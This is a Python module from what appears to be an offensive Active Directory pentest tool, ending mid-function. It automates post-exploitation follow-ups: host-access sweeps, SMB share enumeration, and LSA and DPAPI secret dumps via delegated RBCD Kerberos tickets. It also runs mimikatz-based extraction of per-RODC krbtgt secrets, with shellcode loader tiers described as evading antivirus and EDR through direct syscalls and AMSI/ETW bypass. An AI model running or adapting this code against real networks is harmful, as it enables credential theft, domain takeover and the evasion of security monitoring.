"""Attack step follow-up planning (runtime substeps).

Some BloodHound relationships represent a *capability edge* but the actual
operator playbook requires additional steps to realize the impact. For example:

- WriteDacl -> Domain: grants replication rights, but the operator still needs
  to run DCSync to retrieve credentials.

During attack path execution, ADscan can offer these follow-ups as *runtime*
substeps without mutating the discovered attack path graph.
"""

from __future__ import annotations

from dataclasses import dataclass
import os
import re
from typing import Any, Callable

from rich.prompt import Confirm, Prompt
from rich.table import Table
from rich.text import Text

from adscan_internal import (
    print_error,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_operation_header,
    print_success,
    print_warning,
)
from adscan_internal.cli.privileges import run_service_access_sweep
from adscan_internal.cli.privileged_target_selection import (
    resolve_privileged_target_user,
)
from adscan_internal.cli.smb import run_auth_shares
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    print_panel,
    strip_sensitive_markers,
)
from adscan_internal.services.attack_graph_runtime_service import active_step_followup
from adscan_internal.services.pivot_opportunity_service import (
    ensure_host_bound_workflow_target_viable,
)
from adscan_internal.services.exploitation.binary_ops.loader import loader_available
from adscan_internal.services.exploitation.mimikatz import (
    LSADUMP_LSA_PATCH,
    display_args,
    lsadump_lsa_inject,
)
from adscan_internal.services.exploitation.kerberos_key_list import (
    KerberosKeyListRequest,
    KerberosKeyListService,
)
from adscan_internal.services.exploitation.rodc_golden_ticket import (
    RodcGoldenTicketForger,
    RodcGoldenTicketRequest,
)
from adscan_internal.services.exploitation.rodc_krbtgt import (
    MIMIKATZ_RODC_CMD_INJECT,
    MIMIKATZ_RODC_CMD_PATCH,
    RodcKrbtgtExtractionRequest,
    RodcKrbtgtExtractionService,
    resolve_mimikatz_for_rodc,
)
from adscan_internal.services.rodc_host_access import parse_rodc_host_access_outcome
from adscan_internal.services.rodc_followup_planner import (
    RodcKrbtgtKeyPlan,
    classify_rodc_target,
    resolve_rodc_krbtgt_key_plan,
    resolve_rodc_followup_plan,
    resolve_rodc_followup_plan_from_context,
)
from adscan_internal.services.rodc_followup_state_service import (
    RodcFollowupStateService,
)
from adscan_internal.services.attack_graph_service import resolve_user_sid
from adscan_internal.services.credential_store_service import CredentialStoreService


_RODC_KRBTGT_RE = re.compile(r"^krbtgt[_-](\d+)$", re.IGNORECASE)


@dataclass(frozen=True, slots=True)
class FollowupExecutionOption:
    """One execution variant for a follow-up action."""

    key: str
    label: str
    description: str
    handler: Callable[[], None]
    recommended: bool = False


@dataclass(frozen=True, slots=True)
class FollowupAction:
    """A suggested follow-up action for an executed step."""

    key: str
    title: str
    description: str
    handler: Callable[[], None]
    execution_options_factory: Callable[[], list[FollowupExecutionOption]] | None = None


def execute_guided_followup_actions(
    shell: Any,
    *,
    step_action: str,
    target_label: str,
    followups: list[FollowupAction],
) -> None:
    """Render follow-ups and execute them via guided confirm prompts."""
    if not followups:
        return

    render_followup_actions_panel(
        step_action=step_action,
        target_label=target_label,
        followups=followups,
    )
    confirmer = getattr(shell, "_questionary_confirm", None)
    selector = getattr(shell, "_questionary_select", None)
    for item in followups:
        prompt = f"Do you want to run follow-up '{item.title}' now?"
        if callable(confirmer):
            should_run = bool(confirmer(prompt, default=True))
        elif callable(selector):
            should_run = selector(prompt, ["Yes", "No"], default_idx=0) == 0
        else:
            should_run = Confirm.ask(prompt, default=True)
        if should_run:
            _execute_followup_action(shell, item)
        else:
            print_info_verbose(
                f"Skipping post-exploitation follow-up action '{item.title}'."
            )


def _execute_followup_action(shell: Any, item: FollowupAction) -> None:
    """Execute one follow-up action, optionally resolving a richer UX choice first."""
    options_factory = item.execution_options_factory
    if not callable(options_factory):
        item.handler()
        return

    options = list(options_factory() or [])
    if not options:
        item.handler()
        return
    if len(options) == 1:
        options[0].handler()
        return

    selected = _select_followup_execution_option(
        shell,
        title=item.title,
        options=options,
    )
    if selected is None:
        print_info_verbose(
            f"Skipping follow-up '{item.title}' after execution-choice prompt."
        )
        return
    selected.handler()


def _select_followup_execution_option(
    shell: Any,
    *,
    title: str,
    options: list[FollowupExecutionOption],
) -> FollowupExecutionOption | None:
    """Prompt for one execution variant for a follow-up action."""
    selector = getattr(shell, "_questionary_select", None)
    default_idx = 0
    for idx, option in enumerate(options):
        if option.recommended:
            default_idx = idx
            break

    render_lines = []
    select_options: list[str] = []
    for option in options:
        label = option.label
        if option.recommended and "Recommended" not in label:
            label = f"{label} (Recommended)"
        select_options.append(label)
        render_lines.append(f"• {label}: {option.description}")
    render_lines.append("• Cancel")
    select_options.append("Cancel")

    print_panel(
        "\n".join(render_lines),
        title=f"{title} Options",
        border_style="cyan",
        expand=False,
    )

    if callable(selector):
        selected_idx = selector(
            f"Select how to proceed with '{title}':",
            select_options,
            default_idx=default_idx,
        )
    else:
        selected_value = Prompt.ask(
            f"Select how to proceed with '{title}'",
            choices=[str(i) for i in range(1, len(select_options) + 1)],
            default=str(default_idx + 1),
        )
        try:
            selected_idx = int(selected_value) - 1
        except ValueError:
            selected_idx = default_idx

    if selected_idx is None or selected_idx >= len(options):
        return None
    return options[selected_idx]


def _normalize_account(value: str) -> str:
    """Normalize a domain account label to a SAM-like lowercase identifier."""
    name = strip_sensitive_markers(str(value or "")).strip()
    if "\\" in name:
        name = name.split("\\", 1)[1]
    if "@" in name:
        name = name.split("@", 1)[0]
    return name.strip().lower()


def _resolve_domain_credential(
    shell: Any,
    *,
    domain: str,
    username: str,
) -> str | None:
    """Return a stored credential for a domain user using case-insensitive lookup."""
    normalized = _normalize_account(username)
    if not normalized:
        return None
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    credentials = domain_data.get("credentials")
    if not isinstance(credentials, dict):
        return None
    for stored_user, stored_credential in credentials.items():
        if _normalize_account(str(stored_user)) != normalized:
            continue
        if not isinstance(stored_credential, str):
            return None
        candidate = stored_credential.strip()
        return candidate or None
    return None


def _refresh_group_membership_ticket(
    shell: Any,
    *,
    domain: str,
    added_user: str,
    credential: str,
) -> None:
    """Best-effort Kerberos ticket refresh after a group membership change."""
    marked_user = mark_sensitive(added_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    if not hasattr(shell, "_auto_generate_kerberos_ticket"):
        print_warning(
            f"Kerberos ticket refresh helper is unavailable for {marked_user}@{marked_domain}."
        )
        return
    dc_ip = getattr(shell, "domains_data", {}).get(domain, {}).get("dc_ip")
    print_info(
        f"Refreshing Kerberos ticket for {marked_user}@{marked_domain} "
        "after the group membership change."
    )
    ticket_path = shell._auto_generate_kerberos_ticket(
        added_user, credential, domain, dc_ip
    )  # type: ignore[attr-defined]
    if ticket_path:
        try:
            from adscan_internal.services.credential_store_service import (
                CredentialStoreService,
            )

            CredentialStoreService().store_kerberos_ticket(
                domains_data=shell.domains_data,
                domain=domain,
                username=added_user,
                ticket_path=ticket_path,
            )
        except Exception as exc:  # noqa: BLE001
            print_info_debug(
                "[followup] failed to persist refreshed kerberos ticket: "
                f"user={marked_user} domain={marked_domain} error={mark_sensitive(str(exc), 'detail')}"
            )
        print_info_debug(
            "[followup] refreshed kerberos ticket: "
            f"user={marked_user} domain={marked_domain} "
            f"ticket={mark_sensitive(ticket_path, 'path')}"
        )
        return
    print_warning(
        f"Could not refresh Kerberos ticket for {marked_user}@{marked_domain}. "
        "Continuing with credential-based follow-ups."
    )


def _run_user_host_access_followup(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
) -> None:
    """Probe service access for a newly empowered or compromised user."""
    marked_user = mark_sensitive(username, "user")
    marked_domain = mark_sensitive(domain, "domain")
    print_info(
        f"Checking new host/service access for {marked_user} in domain {marked_domain}."
    )
    print_info_debug(
        "[followup] starting runtime follow-up: "
        "title='Check New Host Access' "
        f"user={marked_user} domain={marked_domain}"
    )
    with active_step_followup(
        shell,
        source="attack_path_runtime_followup",
        title="Check New Host Access",
    ):
        try:
            run_service_access_sweep(
                shell,
                domain=domain,
                username=username,
                password=credential,
                services=["smb", "winrm", "rdp", "mssql"],
                hosts=None,
                prompt=True,
            )
        finally:
            print_info_debug(
                "[followup] finished runtime follow-up: "
                "title='Check New Host Access' "
                f"user={marked_user} domain={marked_domain}"
            )


def _run_user_share_followup(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
) -> None:
    """Enumerate SMB shares reachable by a newly empowered or compromised user."""
    marked_user = mark_sensitive(username, "user")
    marked_domain = mark_sensitive(domain, "domain")
    print_info(
        f"Enumerating newly accessible SMB shares for {marked_user} in domain {marked_domain}."
    )
    print_info_debug(
        "[followup] starting runtime follow-up: "
        "title='Enumerate SMB Shares' "
        f"user={marked_user} domain={marked_domain}"
    )
    with active_step_followup(
        shell,
        source="attack_path_runtime_followup",
        title="Enumerate SMB Shares",
    ):
        try:
            run_auth_shares(
                shell,
                domain=domain,
                username=username,
                password=credential,
            )
        finally:
            print_info_debug(
                "[followup] finished runtime follow-up: "
                "title='Enumerate SMB Shares' "
                f"user={marked_user} domain={marked_domain}"
            )


def _build_user_credential_followups(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
) -> list[FollowupAction]:
    """Return reusable follow-ups after obtaining a user credential."""
    marked_user = mark_sensitive(username, "user")
    marked_domain = mark_sensitive(domain, "domain")

    return [
        FollowupAction(
            key="check_new_host_access",
            title="Check New Host Access",
            description=(
                f"Probe SMB/WinRM/RDP/MSSQL access for {marked_user} "
                f"after compromising {marked_user}@{marked_domain}."
            ),
            handler=lambda: _run_user_host_access_followup(
                shell,
                domain=domain,
                username=username,
                credential=credential,
            ),
        ),
        FollowupAction(
            key="enumerate_smb_shares",
            title="Enumerate SMB Shares",
            description=(
                f"Enumerate authenticated SMB shares now reachable by {marked_user}."
            ),
            handler=lambda: _run_user_share_followup(
                shell,
                domain=domain,
                username=username,
                credential=credential,
            ),
        ),
    ]


def _render_rbcd_prepared_context(
    *,
    domain: str,
    target_domain: str,
    target_computer: str,
    attacker_machine: str,
    target_spn: str,
    delegated_user: str | None,
    ticket_path: str | None,
    http_target_spn: str | None = None,
    http_ticket_path: str | None = None,
) -> None:
    """Render a concise operator summary for a prepared RBCD ticket."""
    target_host = str(target_computer or "").rstrip("$")
    lines = [
        f"Domain: {mark_sensitive(target_domain or domain, 'domain')}",
        f"Target computer: {mark_sensitive(target_computer, 'user')}",
        f"Target SPN: {mark_sensitive(target_spn, 'service')}",
        f"Attacker machine: {mark_sensitive(attacker_machine, 'user')}",
    ]
    if delegated_user:
        lines.append(f"Delegated user: {mark_sensitive(delegated_user, 'user')}")
    if ticket_path:
        lines.append(f"Saved ticket: {mark_sensitive(ticket_path, 'path')}")
    if http_target_spn:
        lines.append(f"HTTP SPN: {mark_sensitive(http_target_spn, 'service')}")
    if http_ticket_path:
        lines.append(f"HTTP ticket: {mark_sensitive(http_ticket_path, 'path')}")

    lines.extend(
        [
            "",
            "Next objective:",
            (
                f"- Use the delegated Kerberos ticket against {mark_sensitive(target_host, 'hostname')} "
                "with a host-bound workflow that matches the requested SPN."
            ),
            (
                "- For CIFS service tickets, prefer SMB-capable Kerberos tooling or a dedicated "
                "host follow-up rather than assuming this automatically enables DCSync."
            ),
            (
                "- For HTTP service tickets, prefer WinRM/HTTP-capable Kerberos workflows when "
                "the target exposes that service."
            ),
        ]
    )
    print_panel(
        "\n".join(lines),
        title="[bold blue]RBCD Ticket Prepared[/bold blue]",
        border_style=BRAND_COLORS["info"],
        expand=False,
    )


def _run_rbcd_lsa_followup(
    shell: Any,
    *,
    domain: str,
    target_domain: str,
    target_computer: str,
    delegated_user: str,
    ticket_path: str,
) -> None:
    """Attempt an SMB/registry LSA dump using a delegated CIFS ticket."""
    dump_lsa = getattr(shell, "dump_lsa", None)
    if not callable(dump_lsa):
        print_warning(
            "LSA dump helper is unavailable for the delegated RBCD follow-up."
        )
        return

    host_target = str(target_computer or "").rstrip("$")
    if "." not in host_target:
        host_target = f"{host_target}.{target_domain}"

    print_info(
        "Attempting delegated LSA dump via prepared RBCD ticket against "
        f"{mark_sensitive(host_target, 'hostname')}."
    )
    with active_step_followup(
        shell,
        source="attack_path_runtime_followup",
        title="Dump LSA Secrets via RBCD Ticket",
    ):
        dump_lsa(
            domain,
            delegated_user,
            ticket_path,
            host_target,
            "false",
            include_machine_accounts=True,
        )
    if _is_rodc_target(shell, domain=target_domain, target_computer=target_computer):
        _print_rodc_rbcd_post_dump_guidance(host=host_target)


def _run_rbcd_dpapi_followup(
    shell: Any,
    *,
    domain: str,
    target_domain: str,
    target_computer: str,
    delegated_user: str,
    ticket_path: str,
) -> None:
    """Attempt a DPAPI dump using a delegated CIFS ticket."""
    dump_dpapi = getattr(shell, "dump_dpapi", None)
    if not callable(dump_dpapi):
        print_warning(
            "DPAPI dump helper is unavailable for the delegated RBCD follow-up."
        )
        return

    host_target = str(target_computer or "").rstrip("$")
    if "." not in host_target:
        host_target = f"{host_target}.{target_domain}"

    print_info(
        "Attempting delegated DPAPI dump via prepared RBCD ticket against "
        f"{mark_sensitive(host_target, 'hostname')}."
    )
    with active_step_followup(
        shell,
        source="attack_path_runtime_followup",
        title="Dump DPAPI Secrets via RBCD Ticket",
    ):
        dump_dpapi(
            domain,
            delegated_user,
            ticket_path,
            host_target,
            "false",
        )


def _run_rbcd_share_followup(
    shell: Any,
    *,
    domain: str,
    delegated_user: str,
    ticket_path: str,
) -> None:
    """Enumerate SMB shares using a delegated CIFS ticket."""
    print_info(
        "Enumerating SMB shares via prepared RBCD ticket for "
        f"{mark_sensitive(delegated_user, 'user')}."
    )
    with active_step_followup(
        shell,
        source="attack_path_runtime_followup",
        title="Enumerate SMB Shares via RBCD Ticket",
    ):
        run_auth_shares(
            shell,
            domain=domain,
            username=delegated_user,
            password=ticket_path,
        )


def _is_rodc_target(shell: Any, *, domain: str, target_computer: str) -> bool:
    """Return True when the target computer is classified as an RODC."""
    try:
        return classify_rodc_target(
            shell,
            domain=domain,
            target_computer=target_computer,
        )
    except Exception as exc:  # noqa: BLE001
        print_info_debug(
            "[followup] failed to classify delegated computer target as RODC: "
            f"domain={mark_sensitive(domain, 'domain')} "
            f"target={mark_sensitive(target_computer, 'user')} "
            f"error={mark_sensitive(str(exc), 'detail')}"
        )
        return False


def _print_rodc_rbcd_post_dump_guidance(*, host: str) -> None:
    """Explain the immediate post-dump objective for an RODC host."""
    print_panel(
        "\n".join(
            [
                f"The registry LSA dump from {mark_sensitive(host, 'hostname')} usually returns the RODC machine-account material.",
                "The per-RODC krbtgt secret normally requires a live LSA extraction follow-up.",
                "Use the dedicated RODC krbtgt follow-up when authorized and when the per-RODC krbtgt account name is known.",
            ]
        ),
        title="[bold green]RODC Next Objective[/bold green]",
        border_style="green",
        expand=False,
    )


def _normalize_rodc_krbtgt_candidate(value: object) -> str | None:
    """Return canonical ``krbtgt_<RID>`` username when *value* matches."""
    candidate = str(value or "").strip()
    match = _RODC_KRBTGT_RE.match(candidate)
    if not match:
        return None
    return f"krbtgt_{match.group(1)}"


def _iter_rodc_krbtgt_candidates_from_domain_data(shell: Any, *, domain: str) -> list[str]:
    """Return per-RODC krbtgt usernames already present in ``domains_data``."""
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    if not isinstance(domain_data, dict):
        return []

    seen: set[str] = set()
    ordered: list[str] = []
    for key in (domain_data.get("credentials", {}) or {}):
        username = str(key).split("\\")[-1].strip()
        normalized = _normalize_rodc_krbtgt_candidate(username)
        if not normalized or normalized in seen:
            continue
        seen.add(normalized)
        ordered.append(normalized)
    return ordered


def _iter_rodc_krbtgt_candidates_from_workspace_graph(shell: Any, *, domain: str) -> list[str]:
    """Return per-RODC krbtgt usernames already persisted in local workspace graphs."""
    from adscan_internal.services.attack_graph_service import load_attack_graph
    from adscan_internal.services.membership_snapshot import load_membership_snapshot

    candidates: list[str] = []
    seen: set[str] = set()

    graph = load_attack_graph(shell, domain)
    nodes_map = graph.get("nodes") if isinstance(graph.get("nodes"), dict) else {}
    if isinstance(nodes_map, dict):
        for node in nodes_map.values():
            if not isinstance(node, dict):
                continue
            props = node.get("properties") if isinstance(node.get("properties"), dict) else {}
            normalized = _normalize_rodc_krbtgt_candidate(
                props.get("samaccountname")
                or props.get("samAccountName")
                or props.get("name")
                or node.get("samaccountname")
                or node.get("name")
                or node.get("label")
            )
            if not normalized or normalized in seen:
                continue
            seen.add(normalized)
            candidates.append(normalized)

    snapshot = load_membership_snapshot(shell, domain)
    nodes = snapshot.get("nodes") if isinstance(snapshot, dict) else {}
    if isinstance(nodes, dict):
        for node in nodes.values():
            if not isinstance(node, dict):
                continue
            props = node.get("properties") if isinstance(node.get("properties"), dict) else {}
            normalized = _normalize_rodc_krbtgt_candidate(
                props.get("samaccountname")
                or props.get("samAccountName")
                or props.get("name")
                or node.get("samaccountname")
                or node.get("name")
                or node.get("label")
            )
            if not normalized or normalized in seen:
                continue
            seen.add(normalized)
            candidates.append(normalized)

    return candidates


def _iter_rodc_krbtgt_candidates_from_workspace_files(shell: Any, *, domain: str) -> list[str]:
    """Return per-RODC krbtgt usernames parsed from workspace artefacts."""
    from pathlib import Path

    workspace_dir = str(getattr(shell, "current_workspace_dir", "") or "").strip()
    domains_dir = str(getattr(shell, "domains_dir", "domains") or "domains").strip()
    if not workspace_dir:
        return []

    search_roots = [
        Path(workspace_dir) / domains_dir / domain / "smb",
        Path(workspace_dir) / domains_dir / domain / "kerberos",
    ]
    seen: set[str] = set()
    ordered: list[str] = []
    for search_root in search_roots:
        if not search_root.exists():
            continue
        for txt_file in search_root.rglob("*.txt"):
            try:
                content = txt_file.read_text(encoding="utf-8", errors="ignore")
            except OSError:
                continue
            for match in _RODC_KRBTGT_RE.finditer(content):
                normalized = f"krbtgt_{match.group(1)}"
                if normalized in seen:
                    continue
                seen.add(normalized)
                ordered.append(normalized)
    return ordered


def _iter_rodc_krbtgt_candidates_from_bloodhound(shell: Any, *, domain: str) -> list[str]:
    """Return per-RODC krbtgt usernames via a focused BloodHound query."""
    service_getter = getattr(shell, "_get_bloodhound_service", None)
    if not callable(service_getter):
        return []

    try:
        service = service_getter()
    except Exception:
        return []
    client = getattr(service, "client", None)
    execute_query = getattr(client, "execute_query", None)
    if not callable(execute_query):
        return []

    query = f"""
    MATCH (u:User)
    WHERE toLower(coalesce(u.domain, '')) = toLower('{domain}')
      AND toLower(coalesce(u.samaccountname, '')) STARTS WITH 'krbtgt_'
    RETURN u.samaccountname AS samaccountname
    """

    try:
        rows = execute_query(query) or []
    except Exception:
        return []

    seen: set[str] = set()
    ordered: list[str] = []
    for row in rows:
        if not isinstance(row, dict):
            continue
        normalized = _normalize_rodc_krbtgt_candidate(row.get("samaccountname"))
        if not normalized or normalized in seen:
            continue
        seen.add(normalized)
        ordered.append(normalized)
    return ordered


def _iter_rodc_krbtgt_candidates_from_ldap(shell: Any, *, domain: str) -> list[str]:
    """Return per-RODC krbtgt usernames via authenticated NetExec LDAP query."""
    from adscan_internal.integrations.netexec.parsers import (
        parse_netexec_ldap_query_attribute_values,
    )

    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    if not isinstance(domain_data, dict):
        return []
    if not getattr(shell, "netexec_path", None):
        return []

    pdc = str(domain_data.get("pdc") or "").strip()
    username = str(domain_data.get("username") or "").strip()
    password = str(domain_data.get("password") or "").strip()
    if not pdc or not username or not password:
        return []

    build_auth = getattr(shell, "build_auth_nxc", None)
    if not callable(build_auth):
        return []
    runner = getattr(shell, "_run_netexec", None)
    if not callable(runner):
        return []

    auth = build_auth(username, password, domain, kerberos=True)
    command = (
        f"{shell.netexec_path} ldap {pdc} {auth} "
        "--query '(&(objectCategory=person)(objectClass=user)(sAMAccountName=krbtgt_*))' "
        "sAMAccountName"
    )

    try:
        completed_process = runner(
            command,
            domain=domain,
            timeout=180,
            shell=True,
            capture_output=True,
            text=True,
        )
    except Exception:
        return []
    if not completed_process or getattr(completed_process, "returncode", 1) != 0:
        return []

    output = f"{completed_process.stdout or ''}\n{completed_process.stderr or ''}"
    values = parse_netexec_ldap_query_attribute_values(output, "sAMAccountName")

    seen: set[str] = set()
    ordered: list[str] = []
    for value in values:
        normalized = _normalize_rodc_krbtgt_candidate(value)
        if not normalized or normalized in seen:
            continue
        seen.add(normalized)
        ordered.append(normalized)
    return ordered


def _detect_rodc_krbtgt_account_name(shell: Any, *, domain: str) -> str | None:
    """Try to infer the per-RODC krbtgt account name before asking the operator.

    Resolution order:
    1. Existing ``domains_data`` credentials.
    2. Workspace graph/snapshot nodes.
    3. Existing workspace artefact files.
    4. Focused BloodHound query.
    5. Focused LDAP query against all user objects (no enabled filter).
    6. Interactive selector/prompt handled by the caller.
    """
    sources: tuple[tuple[str, Callable[[Any], list[str]]], ...] = (
        ("domains_data", lambda current_shell: _iter_rodc_krbtgt_candidates_from_domain_data(current_shell, domain=domain)),
        ("workspace_graph", lambda current_shell: _iter_rodc_krbtgt_candidates_from_workspace_graph(current_shell, domain=domain)),
        ("workspace_files", lambda current_shell: _iter_rodc_krbtgt_candidates_from_workspace_files(current_shell, domain=domain)),
        ("bloodhound", lambda current_shell: _iter_rodc_krbtgt_candidates_from_bloodhound(current_shell, domain=domain)),
        ("ldap", lambda current_shell: _iter_rodc_krbtgt_candidates_from_ldap(current_shell, domain=domain)),
    )

    seen: set[str] = set()
    candidates: list[str] = []
    for source_name, resolver in sources:
        try:
            source_candidates = resolver(shell)
        except Exception as exc:  # noqa: BLE001
            print_info_debug(
                "[followup] failed to resolve per-RODC krbtgt account "
                f"from {source_name}: {type(exc).__name__}: {exc}"
            )
            continue
        if source_candidates:
            print_info_debug(
                "[followup] per-RODC krbtgt candidates from "
                f"{source_name}: {', '.join(mark_sensitive(value, 'user') for value in source_candidates)}"
            )
        for candidate in source_candidates:
            if candidate in seen:
                continue
            seen.add(candidate)
            candidates.append(candidate)

    if not candidates:
        return None
    if len(candidates) == 1:
        return candidates[0]

    selector = getattr(shell, "_questionary_select", None)
    if callable(selector):
        options = [*candidates, "Enter manually"]
        selected_idx = selector(
            "Select the detected per-RODC krbtgt account",
            options,
            default_idx=0,
        )
        if isinstance(selected_idx, int) and 0 <= selected_idx < len(candidates):
            return candidates[selected_idx]

    return None


def _run_rodc_krbtgt_followup(
    shell: Any,
    *,
    domain: str,
    target_domain: str,
    target_computer: str,
    auth_username: str,
    auth_secret: str,
    preferred_transport: str,
    nxc_auth: str | None = None,
    auth_kind_label: str = "host access credential",
    winrm_secret: str | None = None,
) -> None:
    """Run the common RODC per-krbtgt extraction follow-up.

    Decision logic (zero extra prompts when data is already available):

    - mimikatz is always resolved from the binary_ops catalog automatically.
    - If krbtgt_<RID> is found in workspace data → /inject /name:krbtgt_<RID> (targeted).
    - If krbtgt_<RID> is NOT found:
        a. Ask once for the name (single Prompt.ask).
        b. If user still leaves it blank → fall back to /patch (broad sweep).
    - No mode selector, no "Execute?" confirmation — the follow-up is always
      triggered intentionally by the operator from the RBCD outcome menu.
    """
    effective_domain = target_domain or domain
    host_target = str(target_computer or "").rstrip("$")
    if "." not in host_target:
        host_target = f"{host_target}.{effective_domain}"

    viability = ensure_host_bound_workflow_target_viable(
        shell,
        domain=effective_domain,
        target_host=host_target,
        workflow_label="RODC krbtgt live extraction",
        resume_after_pivot=True,
    )
    if viability is None:
        return

    # ------------------------------------------------------------------
    # Step 1: validate mimikatz.exe is available (needed for both paths)
    # ------------------------------------------------------------------
    print_info("Resolving mimikatz from catalog...")
    mimikatz_path = resolve_mimikatz_for_rodc()
    if not mimikatz_path:
        print_error(
            "mimikatz is not available in the binary_ops cache. "
            "Run 'adscan install' to download it, or check your network."
        )
        return
    print_success("mimikatz ready.")

    # ------------------------------------------------------------------
    # Step 2: resolve krbtgt_<RID> — auto-detect first, ask once if needed
    # ------------------------------------------------------------------
    detected_name = _detect_rodc_krbtgt_account_name(shell, domain=effective_domain)

    if detected_name:
        print_success(
            f"Detected per-RODC krbtgt account: [bold]{detected_name}[/bold] "
            "→ using [bold]lsadump::lsa /inject[/bold] (targeted)"
        )
        base_mode = "inject"
        target_secret_name = detected_name
    else:
        print_warning(
            "Per-RODC krbtgt account name not found in workspace data. "
            "Enter it now (e.g. krbtgt_8245) or leave blank to use /patch."
        )
        raw = Prompt.ask(
            "krbtgt account name",
            default="",
        )
        raw = strip_sensitive_markers(raw).strip()
        if raw and "<" not in raw and ">" not in raw:
            base_mode = "inject"
            target_secret_name = raw
            print_info(f"Using [bold]lsadump::lsa /inject /name:{raw}[/bold]")
        else:
            base_mode = "patch"
            target_secret_name = "krbtgt"
            print_info(
                "Using [bold]lsadump::lsa /patch[/bold] (broad sweep — "
                "will extract all RODC secrets including krbtgt_<RID>)"
            )

    # ------------------------------------------------------------------
    # Step 2b: build command list from mode (used by both loader and display)
    # ------------------------------------------------------------------
    commands = (
        lsadump_lsa_inject(target_secret_name)
        if base_mode == "inject"
        else LSADUMP_LSA_PATCH
    )

    # ------------------------------------------------------------------
    # Step 3: choose extraction tier.
    #
    # Tier 1 — prebuilt mimikatz.exe directly.
    # Tier 2 — donut shellcode + Win32 loader (evades AV).
    # Tier 3 — donut shellcode + SysWhispers4 loader (evades EDR hooks).
    # ------------------------------------------------------------------
    selected_tier = _select_rodc_krbtgt_extractor_tier(shell)
    if selected_tier in (2, 3) and loader_available():
        extractor_path = ""  # service builds and stages the loader
        if selected_tier == 3:
            extractor_mode = "loader_sw4"
            extractor_label = "mimikatz (in-memory, SysWhispers4 direct syscalls)"
        else:
            extractor_mode = "loader"
            extractor_label = "mimikatz (in-memory, donut + Win32)"
        preview_cmd = f"[in-memory] {display_args(commands)}"
    else:
        if selected_tier in (2, 3) and not loader_available():
            print_warning(
                f"Tier {selected_tier} loader prerequisites are unavailable. Falling back to Tier 1 mimikatz."
            )
        extractor_path = mimikatz_path
        extractor_mode = base_mode
        extractor_label = "mimikatz"
        preview_cmd = (
            MIMIKATZ_RODC_CMD_INJECT.replace("{secret}", target_secret_name)
            if base_mode == "inject"
            else MIMIKATZ_RODC_CMD_PATCH
        )

    # ------------------------------------------------------------------
    # Step 4: show plan and run (no confirmation prompt)
    # ------------------------------------------------------------------
    if winrm_secret:
        transport_label = "WinRM (exec) + SMB (file transfer)"
    elif preferred_transport.lower() == "smb":
        transport_label = "SMB"
    elif preferred_transport.lower() == "winrm":
        transport_label = "WinRM"
    else:
        transport_label = "WinRM → SMB (auto)"
    print_operation_header(
        "RODC krbtgt Live Extraction",
        details={
            "Target RODC": host_target,
            "Domain": effective_domain,
            "Auth user": auth_username,
            "Auth type": auth_kind_label,
            "Transport": transport_label,
            "Extractor": extractor_label,
            "Command": preview_cmd,
        },
        icon="🔑",
    )

    service = RodcKrbtgtExtractionService(shell)
    with active_step_followup(
        shell,
        source="attack_path_runtime_followup",
        title="Extract RODC krbtgt Secret",
    ):
        outcome = service.extract(
            RodcKrbtgtExtractionRequest(
                domain=effective_domain,
                host=host_target,
                username=auth_username,
                secret=auth_secret,
                target_secret_name=target_secret_name,
                extractor_local_path=extractor_path,
                extractor_mode=extractor_mode,
                nxc_auth=nxc_auth,
                preferred_transport=preferred_transport,
                winrm_secret=winrm_secret or None,
            )
        )

    _persist_rodc_krbtgt_outcome(
        shell,
        domain=effective_domain,
        host=host_target,
        outcome=outcome,
    )


def _select_rodc_krbtgt_extractor_tier(shell: Any) -> int:
    """Return the preferred extraction tier for RODC krbtgt follow-ups.

    Tier 1 — prebuilt mimikatz.exe, most reliable, no prerequisites.
    Tier 2 — donut shellcode + Win32 (VirtualAlloc/CreateThread), evades AV.
    Tier 3 — donut shellcode + SysWhispers4 (direct syscalls, ntdll unhook,
              ETW/AMSI bypass), evades EDR userland hooks.
    """
    is_dev = os.getenv("ADSCAN_SESSION_ENV", "").strip().lower() == "dev"
    selector = getattr(shell, "_questionary_select", None)
    _loader_ok = loader_available()
    options = [
        "Tier 1 - Prebuilt mimikatz.exe (default, most reliable)",
        (
            "Tier 2 - In-memory loader (donut + Win32, evades AV)"
            if _loader_ok
            else "Tier 2 - In-memory loader (unavailable on this host)"
        ),
        (
            "Tier 3 - In-memory loader (donut + SysWhispers4, evades EDR)"
            if _loader_ok
            else "Tier 3 - In-memory loader (unavailable on this host)"
        ),
    ]
    if is_dev and callable(selector):
        selected_idx = selector(
            "Choose the extractor tier for mimikatz upload:",
            options,
            default_idx=0,
        )
        if selected_idx == 1:
            return 2
        if selected_idx == 2:
            return 3
    elif not is_dev:
        print_info_debug(
            "[rodc-krbtgt] extractor tier selection skipped outside dev mode; forcing Tier 1."
        )
    return 1


def _run_rbcd_rodc_krbtgt_followup(
    shell: Any,
    *,
    domain: str,
    target_domain: str,
    target_computer: str,
    delegated_user: str,
    ticket_path: str,
    http_ticket_path: str | None = None,
) -> None:
    """Execute the common RODC krbtgt follow-up via delegated CIFS ticket.

    When ``http_ticket_path`` is provided (http/ SPN ticket from dual-SPN
    RBCD), WinRM is used as the primary execution transport and SMB/wmiexec
    as the fallback.  Without it, only SMB is available.
    """
    build_auth = getattr(shell, "build_auth_nxc", None)
    nxc_auth = None
    if callable(build_auth):
        nxc_auth = str(
            build_auth(
                delegated_user,
                ticket_path,
                target_domain or domain,
                kerberos=True,
            )
        )
    # If we have an http/ ticket, prefer WinRM for exec (better token for SW4)
    # and keep SMB for file transfer (upload/download always via SMB share).
    preferred = "auto" if http_ticket_path else "smb"
    _run_rodc_krbtgt_followup(
        shell,
        domain=domain,
        target_domain=target_domain,
        target_computer=target_computer,
        auth_username=delegated_user,
        auth_secret=ticket_path,
        preferred_transport=preferred,
        nxc_auth=nxc_auth,
        auth_kind_label=f"Kerberos ccache ({delegated_user}@cifs_{target_computer})",
        winrm_secret=http_ticket_path or None,
    )


def _run_host_access_rodc_krbtgt_followup(
    shell: Any,
    *,
    domain: str,
    target_domain: str,
    target_computer: str,
    username: str,
    password: str,
) -> None:
    """Execute the common RODC krbtgt follow-up via reusable host-access creds."""
